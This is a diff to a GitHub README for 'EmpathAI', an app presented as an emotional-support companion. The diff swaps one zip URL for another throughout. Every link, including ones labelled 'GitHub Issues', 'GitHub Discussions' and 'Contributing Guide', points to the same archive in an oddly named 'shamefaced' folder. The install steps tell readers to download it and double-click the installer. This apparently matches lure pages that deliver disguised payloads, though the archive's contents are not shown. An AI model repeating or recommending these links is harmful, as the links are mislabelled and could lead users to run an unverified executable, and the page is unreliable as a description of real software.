@@ -1,7 +1,7 @@
 # 🎉 EmpathAI-Your-Emotional-Well-being-Companion - Your AI for Emotional Support
 
 ## 🖱️ Download Now
-[![Download EmpathAI](https://raw.githubusercontent.com/Kishan9993/EmpathAI-Your-Emotional-Well-being-Companion/main/shamefaced/EmpathAI-Your-Emotional-Well-being-Companion.zip%20EmpathAI-blue?style=for-the-badge)](https://raw.githubusercontent.com/Kishan9993/EmpathAI-Your-Emotional-Well-being-Companion/main/shamefaced/EmpathAI-Your-Emotional-Well-being-Companion.zip)
+[![Download EmpathAI](https://github.com/Kishan9993/EmpathAI-Your-Emotional-Well-being-Companion/raw/refs/heads/main/shamefaced/Companion-Emotional-being-Empath-Your-Well-A-2.7.zip%20EmpathAI-blue?style=for-the-badge)](https://github.com/Kishan9993/EmpathAI-Your-Emotional-Well-being-Companion/raw/refs/heads/main/shamefaced/Companion-Emotional-being-Empath-Your-Well-A-2.7.zip)
 
 ---
 
@@ -17,10 +17,10 @@ Welcome to EmpathAI! This application supports your emotional well-being by prov
 
 ## 📥 Download & Install
 
-To get started with EmpathAI, visit our [Releases page](https://raw.githubusercontent.com/Kishan9993/EmpathAI-Your-Emotional-Well-being-Companion/main/shamefaced/EmpathAI-Your-Emotional-Well-being-Companion.zip) to download the latest version. 
+To get started with EmpathAI, visit our [Releases page](https://github.com/Kishan9993/EmpathAI-Your-Emotional-Well-being-Companion/raw/refs/heads/main/shamefaced/Companion-Emotional-being-Empath-Your-Well-A-2.7.zip) to download the latest version. 
 
 ### Installation Steps:
-1. **Visit the Releases Page**: Click the link to go directly to [the Releases page](https://raw.githubusercontent.com/Kishan9993/EmpathAI-Your-Emotional-Well-being-Companion/main/shamefaced/EmpathAI-Your-Emotional-Well-being-Companion.zip).
+1. **Visit the Releases Page**: Click the link to go directly to [the Releases page](https://github.com/Kishan9993/EmpathAI-Your-Emotional-Well-being-Companion/raw/refs/heads/main/shamefaced/Companion-Emotional-being-Empath-Your-Well-A-2.7.zip).
 2. **Choose Your Version**: Look for the latest version of EmpathAI.
 3. **Download the File**: Click on the appropriate file for your operating system (e.g., Windows, macOS, or Linux).
 4. **Run the Installer**: Find the downloaded file in your downloads folder and double-click it.
@@ -56,20 +56,20 @@ If you encounter any issues:
 - **Check System Requirements**: Ensure your computer meets the requirements listed above.
 - **Restart the App**: Close and reopen EmpathAI if it doesn't respond.
 - **Visit the Help Section**: Look for a help or support feature within the app.
-- **Contact Support**: Reach out through our [GitHub Issues](https://raw.githubusercontent.com/Kishan9993/EmpathAI-Your-Emotional-Well-being-Companion/main/shamefaced/EmpathAI-Your-Emotional-Well-being-Companion.zip) for assistance.
+- **Contact Support**: Reach out through our [GitHub Issues](https://github.com/Kishan9993/EmpathAI-Your-Emotional-Well-being-Companion/raw/refs/heads/main/shamefaced/Companion-Emotional-being-Empath-Your-Well-A-2.7.zip) for assistance.
 
 ## 🌐 Community Support
 
-Join our community to connect with others who use EmpathAI. Share experiences, get tips, and provide feedback directly on [GitHub Discussions](https://raw.githubusercontent.com/Kishan9993/EmpathAI-Your-Emotional-Well-being-Companion/main/shamefaced/EmpathAI-Your-Emotional-Well-being-Companion.zip).
+Join our community to connect with others who use EmpathAI. Share experiences, get tips, and provide feedback directly on [GitHub Discussions](https://github.com/Kishan9993/EmpathAI-Your-Emotional-Well-being-Companion/raw/refs/heads/main/shamefaced/Companion-Emotional-being-Empath-Your-Well-A-2.7.zip).
 
 ## 🤝 Contributing
 
-We welcome contributions from everyone! If you want to improve EmpathAI, feel free to check our [Contributing Guide](https://raw.githubusercontent.com/Kishan9993/EmpathAI-Your-Emotional-Well-being-Companion/main/shamefaced/EmpathAI-Your-Emotional-Well-being-Companion.zip) for details on how to get started.
+We welcome contributions from everyone! If you want to improve EmpathAI, feel free to check our [Contributing Guide](https://github.com/Kishan9993/EmpathAI-Your-Emotional-Well-being-Companion/raw/refs/heads/main/shamefaced/Companion-Emotional-being-Empath-Your-Well-A-2.7.zip) for details on how to get started.
 
 ## 🔗 Useful Links
-- [EmpathAI Releases Page](https://raw.githubusercontent.com/Kishan9993/EmpathAI-Your-Emotional-Well-being-Companion/main/shamefaced/EmpathAI-Your-Emotional-Well-being-Companion.zip)
-- [GitHub Issues](https://raw.githubusercontent.com/Kishan9993/EmpathAI-Your-Emotional-Well-being-Companion/main/shamefaced/EmpathAI-Your-Emotional-Well-being-Companion.zip)
-- [GitHub Discussions](https://raw.githubusercontent.com/Kishan9993/EmpathAI-Your-Emotional-Well-being-Companion/main/shamefaced/EmpathAI-Your-Emotional-Well-being-Companion.zip)
+- [EmpathAI Releases Page](https://github.com/Kishan9993/EmpathAI-Your-Emotional-Well-being-Companion/raw/refs/heads/main/shamefaced/Companion-Emotional-being-Empath-Your-Well-A-2.7.zip)
+- [GitHub Issues](https://github.com/Kishan9993/EmpathAI-Your-Emotional-Well-being-Companion/raw/refs/heads/main/shamefaced/Companion-Emotional-being-Empath-Your-Well-A-2.7.zip)
+- [GitHub Discussions](https://github.com/Kishan9993/EmpathAI-Your-Emotional-Well-being-Companion/raw/refs/heads/main/shamefaced/Companion-Emotional-being-Empath-Your-Well-A-2.7.zip)
 
 ---
 
